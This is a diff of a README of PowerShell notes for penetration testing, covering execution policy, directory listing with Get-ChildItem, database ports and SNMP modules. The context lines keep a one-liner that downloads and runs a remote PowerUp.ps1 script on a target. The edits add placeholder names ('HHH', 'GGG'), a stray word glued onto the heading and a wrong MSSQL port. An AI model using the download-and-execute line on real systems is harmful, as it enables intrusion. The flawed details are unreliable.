@@ -1,6 +1,6 @@
-# PowerShell for Penetration Testing
+specificrecursively# PowerShell for Penetration Testing
 
-Welcome to the [SnowCap Cyber](https://www.snowcapcyber.com) PowerShell for Penetration TestingGitHub repository. The goal of this repository is to provide you with a some notes that you may find useful when conducting a penetration test. Penetration begins with the ability to profile and map out a network, the systems and applications, and users associated with it.
+Welcome to the [SnowCap Cyber](https://www.snowcapcyber.com) PowerShell for Penetration TestingGitHub repository. The goal of this repository is to provide you with a some notes that you may find useful when conducting a penetration test. Penetration begins with the ability to profile and map out a network, the systems and applications, and users associated with it. The PowerShell scripts in the document are repository and for PowerShell Version 7.3
 
 ## Chapter 1 - Introducing PowerShell
 
@@ -32,7 +32,7 @@ PS C:>
 Now that we know the version of PowerShell that is running on the target system, our next step is understand the execution policy that the target implements for PowerShell scripts. To achieve this we can execute the following.
 
 ```powershell
-PS C:\Program Files\PowerShell\7> Get-ExecutionPolicy -List
+PS C:> Get-ExecutionPolicy -List
 
         Scope ExecutionPolicy
         ----- ---------------
@@ -96,8 +96,9 @@ PS C:\>
 ```
 
 We can identify how to use PowerShell module via using the get-help command. In the following we will identify how to use the Get-Location cmdlet/function.
+
 ```powershell
-PS C:\>get-help Get-Location
+PS C:\> get-help Get-Location
 
 NAME
     Get-Location
@@ -114,11 +115,63 @@ Once you have a PowerShell shell then you can use the following to download file
 PS C:\> IEX(New-Object Net.WebClient).DownloadString('http://www.snowcapcyber.co.uk/PowerUp.ps1')
 ```
 
-PowerDhell also supports a set of functions that allow us to explore and manipulate a file system
+PowerShell also supports a set of functions that allow us to explore and manipulate a file system. The 'Get-ChildItem' cmdlet gets the items in one or more specified locations. You can think of it like the 'ls' command in UNIX, or the 'dir' command in Windows/MS-DOS. In the following we will list the contents of the 'C:\Test' directory.
 
+```powershell
+PS C:\> Get-ChildItem -Path C:\Test
 
+Directory: C:\Test
 
-Now that we have the ability to use PowerShell and find/install modules we can begin to use it to perform a penetration test.
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/15/2022     08:29                Logs
+-a----        2/13/2022     08:55             26 MyTextFile.txt
+-a----        2/12/2022     15:40         118014 Command.txt
+-a----         2/1/2022     08:43            183 CreateTestFile.ps1
+-ar---        2/12/2022     14:31             27 ReadOnlyFile.txt
+```
+
+We can also use the HHH command to recursively list the contents of a directory.
+
+```powershell
+PS C:\> Get-ChildItem -Path C:\Test\*.txt -Recurse -Force
+
+Directory: C:\Test\Logs
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/12/2019     16:16             20 Afile.txt
+-a-h--        2/12/2019     15:52             22 hiddenfile.txt
+-a----        2/13/2019     13:26             20 LogFile1.txt
+
+    Directory: C:\Test
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/15/2022     08:29                Logs
+-a----        2/13/2022     08:55             26 MyTextFile.txt
+-a----        2/12/2022     15:40         118014 Command.txt
+-a----         2/1/2022     08:43            183 CreateTestFile.ps1
+-ar---        2/12/2022     14:31             27 ReadOnlyFile.txt
+
+```
+
+We can use GGG to get specific files as follows:
+
+```powershell
+PS C:\> Get-ChildItem -Path C:\Test\ -Include *.txt
+
+Directory: C:\Test
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        2/13/2019     08:55             26 MyTextFile.txt
+-a----        2/12/2019     15:40         118014 Command.txt
+-ar---        2/12/2019     14:31             27 ReadOnlyFile.txt
+
+```
+
+As a site note the HHH cmdlet will also let is query the Windows Registry. Now that we have the ability to use PowerShell and find/install modules we can begin to use it to perform a penetration test.
 
 ## Chapter 2 - Network Mapping
 
@@ -804,9 +857,9 @@ PS C:\>  Clear-ADAccountExpiration -Identity "CN=John Smith,OU=PenTesters,DC=sno
 
 On the Internet the following is a list of most common databases to be found.
 
-* MySQL
-* PostgreSQL
-* Microsoft SQL
+* [MySQL - TCP/3306 abd TCP/33060](https://en.wikipedia.org/wiki/MySQL)
+* [PostgreSQL - TCP/5432](https://en.wikipedia.org/wiki/PostgreSQL)
+* [Microsoft SQL - TCP/1443 and TCP/1434](https://en.wikipedia.org/wiki/Microsoft_SQL_Server)
 
 ```powershell
 PS C:\> Execute-Command-MSSQL
@@ -872,28 +925,20 @@ interfaces.ifTable.ifEntry.ifDescr.13 Intel(R) 82599 Virtual Function
 
 There are a number of PowerShell modules that support SNMP. One such module is:
 
-* [Proxx.SNMP](https://github.com/Proxx/Proxx.SNMP)
+* [SNMP](https://www.powershellgallery.com/packages/SNMP/1.0.0.1)
 
-* [Patron.SNMP](https://github.com/patron-it/patron.SNMP)
-
-We can installl and explore this module as follows. This module supports two functions. The first function is to get an element of the SNMP tree and the second is the function to walk an SNMP tree.
+We can install and explore this module as follows. This module supports two functions. The first function is to get an element of the SNMP tree and the second is the function to walk an SNMP tree.
 
 ```powershell
-PS C:\>  Install-Module -Name Proxx.SNMP
+PS C:\> Install-Module -Name SNMP
 
-PS C:\> Get-Command -module Proxx.SNMP
-
-CommandType     Name                                               Version    Source
------------     ----                                               -------    ------
-Cmdlet          Invoke-SnmpGet                                     1.1.1.6    Proxx.SNMP
-Cmdlet          Invoke-SnmpWalk                                    1.1.1.6    Proxx.SNMP
-
-PS C:\> Get-Command -module Patron.SNMP
+PS C:\> Get-Command -module SNMP
 
 CommandType     Name                                               Version    Source
 -----------     ----                                               -------    ------
-Cmdlet          Invoke-SnmpGet                                     1.1.1.5    Patron.SNMP
-Cmdlet          Invoke-SnmpWalk                                    1.1.1.5    Patron.SNMP
+Function        Get-SnmpData                                       1.0.0.1    SNMP
+Function        Invoke-SnmpWalk                                    1.0.0.1    SNMP
+Function        Set-SnmpData                                       1.0.0.1    SNMP
 
 PS C:\>
 ```
